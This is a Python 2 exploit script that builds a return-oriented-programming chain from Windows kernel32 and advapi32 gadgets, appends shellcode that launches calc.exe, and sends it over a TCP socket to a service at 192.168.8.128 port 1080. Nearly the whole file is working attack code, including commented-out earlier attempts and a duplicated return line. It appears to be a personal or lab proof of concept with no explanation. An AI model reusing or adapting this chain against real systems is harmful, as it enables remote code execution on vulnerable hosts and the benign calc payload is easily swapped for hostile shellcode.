import struct

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    # rop_gadgets = "\x90" * 84
    # rop_gadgets += "\xF3\x25\xA1\x71" # POP EBX ; RETN
    # rop_gadgets += "\xFF\xFF\xFF\xFF"  
    # rop_gadgets += "\x6F\x10\x81\x7C"  # INC EBX ;RETN
    # rop_gadgets += "\x28\x25\xA1\x71" # POP EBP ; RETN
    # rop_gadgets += "\xA4\x22\x86\x7C"
    # rop_gadgets += "\xFF\x13\xA2\x71" # POP ESI ; RETN
    # rop_gadgets += "\xBF\x7E\xA2\x71"
    # rop_gadgets += "\x07\x35\xA2\x71" #POP EDI;RETN
    # rop_gadgets += "\xBF\x7E\xA2\x71"
    # rop_gadgets += "\x02\xD1\xE5\x77"
    # rop_gadgets += "\x31\xC9\x51\x68"
    # rop_gadgets += "\x63\x61\x6C\x63"
    # rop_gadgets += "\x54\xB8\x0D\x25"
    # rop_gadgets += "\x86\x7C\xFF\xD0"
    # rop_gadgets += "\x68\xFF\xFF\xFF"
    # rop_gadgets += "\xFF\xFF\x04\x24"
    # rop_gadgets += "\xB8\x12\xCB\x81"
    # rop_gadgets += "\x7C\xFF\xD0\x90"
    # rop_gadgets += "\x90" * 48
    # rop_gadgets += "\xD5\x5E\xBE\x77" #XCHG EAX , ESP ;RETN

        # rop chain generated with mona.py - www.corelan.be

    rop_gadgets = "\x90" * 12

    rop_gadgets += "\x90" * 192

    # rop_gadgets += struct.pack('<L',0x7c862144)

    # rop_gadgets += struct.pack('<L',0x0012fbc0)

    # rop_gadgets += struct.pack('<L',0x77be5ed5)  # XCHG EAX,ESP # RETN
    rop_gadgets += struct.pack('<L',0x7c87f30d)  # POP EDX # POP EAX # POP EBP # RETN [kernel32.dll] 
    rop_gadgets += struct.pack('<L',0xBC5D87E4)  # EDX
    rop_gadgets += struct.pack('<L',0xBC5D87E4)  # EAX
    rop_gadgets += struct.pack('<L',0x7c862144)  # EBP
    rop_gadgets += struct.pack('<L',0x7c85f8b3)  # MOV EBX,DWORD PTR DS:[EDX+C033FFFA] # POP ESI # POP  EBP # RETN 0x14 [kernel32.dll] 
    rop_gadgets += struct.pack('<L',0x7C80e6dd)  # ESI  (RETN)
    rop_gadgets += struct.pack('<L',0x7c862144)  # EBP
    rop_gadgets += struct.pack('<L',0x7c86ce63)  # POP EDI # RETN [kernel32.dll] 
    rop_gadgets += "\x90" * 20;
    rop_gadgets += struct.pack('<L',0x7C80e6dd)  # EDI  (RETN)
    rop_gadgets += struct.pack('<L',0x77dcc5ee)  # PUSHAD # RETN [advavi32.dll] 

    rop_gadgets += "\x31\xC9\x51\x68" # shellcode
    rop_gadgets += "\x63\x61\x6C\x63"
    rop_gadgets += "\x54\xB8\xAD\x23"
    rop_gadgets += "\x86\x7C\xFF\xD0"
    rop_gadgets += "\x68\xFF\xFF\xFF"
    rop_gadgets += "\xFF\xFF\x04\x24"
    rop_gadgets += "\xB8\xFA\xCA\x81"
    rop_gadgets += "\x7C\xFF\xD0\x90"

    return rop_gadgets

    return rop_gadgets

rop_chain = create_rop_chain()

import socket
import time

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
sock.connect(('192.168.8.128', 1080))  
time.sleep(2)  
sock.send(rop_chain)  
print sock.recv(1024)  
sock.close()